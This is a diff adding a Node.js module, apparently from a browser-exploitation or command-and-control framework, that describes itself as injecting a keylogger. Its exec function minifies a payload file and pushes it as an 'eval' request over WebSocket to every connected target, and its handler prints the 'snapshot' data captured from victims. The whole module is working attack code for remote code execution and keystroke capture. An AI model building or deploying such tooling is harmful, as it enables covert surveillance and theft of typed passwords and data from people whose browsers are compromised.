@@ -1,0 +1,28 @@
+exports.data = {
+	//info about the module
+	init: function(options) {
+	},
+	info: function(step /*optional */) {
+		console.log("Injects a keylogger");
+		console.log("Type exec to send the payload");
+	},
+
+	//handler for parsing responses
+	handler: function(options, connection, obj) {
+		if ("snapshot" in obj) {
+			console.log("");
+			console.log('['+connection.name+'] SNAPSHOT:'+obj.snapshot);
+		}
+	},
+
+	//execute the attack
+	exec: function(options,targets,step /* optional */) {
+		var fs = require('fs');
+		var UglifyJS = require("uglify-js");
+		var payload = UglifyJS.minify(fs.readFileSync(__dirname + '/../payloads/snapshot.js','utf8'),{ie8:true}).code; //TODO ERROR CHECK
+		for (var i in targets) {
+			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }));
+		}
+		console.log('Payload sent');
+	}
+};
